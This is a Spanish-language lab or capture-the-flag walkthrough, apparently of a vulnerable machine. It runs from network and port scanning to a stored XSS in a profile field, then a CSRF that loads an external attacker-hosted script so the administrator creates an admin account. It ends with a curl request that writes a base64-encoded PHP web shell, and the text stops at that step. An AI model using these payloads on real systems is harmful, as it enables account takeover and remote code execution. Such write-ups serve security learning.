Descubriendo la IP en la red local

Con el comando arp-scan -I ens33 -localnet -ingnoredups descubrimos la ip de nuestra máquina victima: 192.168.1.37.

Escaneo con nmap

Al escanear con nmap para llevar a cabo un descubrimiento de puertos con el comando nmap -p- --open --min-rate 5000 -vvv -n -Pn 192.168.1.49 -oG allports descubrimos los puertos:

22(ssh)
80(http)
3000(http)
3306(mariaDB)
5000(http)

Después hacemos un escaneo más extenso con el siguiente comando:

nmap -sCV -p80,22,3000,3306,5000 192.168.1.49 -oN targeted

Utilizamos el script de nmap para enumerar el puerto 80: nmap --script http-enum -p80 192.168.1.49 -oN webscan pero solo vemos que hay un directorio /icons. Nada interesante.

Ejecutando el XSS junto con el CSRF

Leyendo el script de searchsploit sobre la vulnerabilidad, nos comentan que hay un campo real name que no esta correctamente sanitizado, pero que además, este campo es vulnerable a un xss cuando en la url conste como que estamos en la siguiente dirección: ?do=myprofile.

Nos damos cuenta que al registrarnos existe este campo real name pero no aparece en la url lo que necesitamos, por lo que se intuye que debemos estar registrados.

Al registrarnos e irnos a nuestro perfil, modificamos el campo real name con el siguiente comando: <script>alert("hola")</script> para ver si es susceptible al xss como nos comenta el script.

Vemos que no hace nada, así que vamos al vídeo de YouTube que nos enlaza el creador de este script y nos damos cuenta que el utiliza, antes del script, lo siguiente: ">.

Volvemos a nuestro campo real name e introducimos lo que nos quedaba y nos damos cuenta que ahora, al recargar la página, funciona el alert.

Ahora lo único que nos falta es encontrar el campo donde acontecer el csrf. Buscando por la página podemos ver el apartado tasklist

Si pinchamos en ella podemos ver que hay reporte de bugs, si pinchamos en ella podemos ver que hay comentario del administrador diciéndonos que va a estar constantemente leyendo esta sección para solucionar posibles bugs por lo que ya hemos encontrado el vector de ataque.

Si escribimos un comentario con nuestro nombre en "><scrip>alert("hola")</script> podemos ver que al recargar en la página, se sigue aconteciendo el xss por lo que podemos hacer es, en el campo real name sería hacer que el administrador , mediante un script externo, nos cree un usuario administrador.

En el script de searchsploit nos comparte un script escrito en js para acontecer esta vulnerabilidad.

Nos creamos en nuestro directorio un archivo, por ejemplo, pwnd.js en el cual está el código malicioso.

En el campo real name introducimos lo siguiente: "><script src="http://192.168.1.150/pwnd.js"></script> mientras que en nuestro directorio con el script nos compartiremos un servidor python.

Por lo que en este punto podemos abusar del preg_replace que está por detrás.

En este punto ya podríamos conseguir una reverse shell. El único inconveniente es que en este punto usando curl podríamos tener bastantes problemas usando el one liner típico.

Por lo que vamos a utilizar una función propia de php para hacer la reverse shell más fácil.

Con el siguiente comando:

curl -s -X PATCH "http://192.168.1.49:5000/ls2o4g/v1.0/posts/1" -H "Content-type: application/json" -b 'token={cookie}' -d $'{"text":"file_put_content(\'cmd.php\',base64_decode(\'{cadena codificada en base64}\'))"}'

Con esto conseguimos crear una dirección a la cual podemos acceder mediante navegador donde se nos va a interpretar nuestro código php:
